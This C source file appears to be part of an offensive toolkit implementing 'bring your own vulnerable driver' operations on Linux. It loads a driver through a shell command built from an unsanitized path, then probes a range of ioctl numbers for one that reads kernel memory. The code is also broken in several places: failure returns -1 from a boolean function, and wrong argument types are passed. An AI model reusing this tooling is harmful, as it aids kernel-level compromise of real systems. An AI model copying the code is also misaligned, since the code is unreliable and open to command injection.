/* BYOVD - Bring Your Own Vulnerable Driver operations for Linux */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

typedef struct {
    int handle;
    int fd;
    char driver_name[256];
} byovd_context_t;

static byovd_context_t* g_byovd = NULL;

int8_t* jocky_byovd_new(void) {
    if (!g_byovd) {
        g_byovd = malloc(sizeof(byovd_context_t));
        if (!g_byovd) return NULL;
        memset(g_byovd, 0, sizeof(byovd_context_t));
        g_byovd->handle = -1;
        g_byovd->fd = -1;
    }
    return (int8_t*)g_byovd;
}

bool jocky_byovd_load(const char* driver_path, const char* service_name, int8_t* ctx) {
    byovd_context_t* bctx = ctx ? (byovd_context_t*)ctx : g_byovd;
    if (!bctx || !driver_path) return false;
    const char* driver = driver_path;

    /* Try to load vulnerable driver */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "modprobe %s 2>/dev/null || insmod %s 2>/dev/null", driver, driver);

    if (system(cmd) != 0) {
        return -1;
    }

    /* Attempt to open driver device */
    char device_path[256];
    snprintf(device_path, sizeof(device_path), "/dev/%s", driver);

    g_byovd->fd = open(device_path, O_RDWR);
    if (g_byovd->fd < 0) {
        /* Try /sys/bus/pci/drivers path */
        snprintf(device_path, sizeof(device_path), "/sys/bus/pci/drivers/%s", driver);
        g_byovd->fd = open(device_path, O_RDONLY);
        if (g_byovd->fd < 0) {
            return -1;
        }
    }

    strncpy(bctx->driver_name, driver, sizeof(bctx->driver_name) - 1);
    bctx->handle = 1;

    return true;
}

void jocky_byovd_unload(int8_t* ctx) {
    byovd_context_t* bctx = ctx ? (byovd_context_t*)ctx : g_byovd;
    if (!bctx) return;

    if (bctx->fd >= 0) {
        close(bctx->fd);
        bctx->fd = -1;
    }

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "modprobe -r %s 2>/dev/null || rmmod %s 2>/dev/null",
             bctx->driver_name, bctx->driver_name);
    system(cmd);
}

void jocky_byovd_destroy(int8_t* ctx) {
    if (!ctx || !g_byovd) return;
    jocky_byovd_unload(g_byovd->handle);
    free(g_byovd);
    g_byovd = NULL;
}

int byovd_test_exploit(int handle) {
    if (!g_byovd || handle != g_byovd->handle || g_byovd->fd < 0) {
        return -1;
    }

    /* Test if the driver allows memory access via ioctl */
    /* Generic test - try to read a single byte from a high kernel address */
    unsigned long test_addr = 0xffffffff80000000UL;  /* Kernel space */
    char dummy;

    /* Try a generic read ioctl - different drivers use different numbers */
    for (unsigned int ioctl_cmd = 0x4000; ioctl_cmd < 0x5000; ioctl_cmd += 4) {
        if (ioctl(g_byovd->fd, ioctl_cmd, &test_addr) == 0) {
            return 0;  /* Exploit works */
        }
    }

    return -1;  /* No working exploit found */
}
